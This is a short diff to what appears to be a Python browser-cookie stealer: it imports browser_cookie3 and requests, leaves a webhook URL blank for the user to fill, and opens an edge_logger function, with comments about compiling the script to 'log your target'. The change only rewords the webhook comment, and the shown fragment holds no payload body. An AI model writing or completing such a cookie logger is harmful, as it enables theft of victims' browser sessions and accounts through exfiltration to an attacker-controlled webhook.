@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-URL = "" # Webhook here and make sure to compile if you wanna log your target
+URL = "" # Put your webhook url here
 
 def edge_logger():
     try:
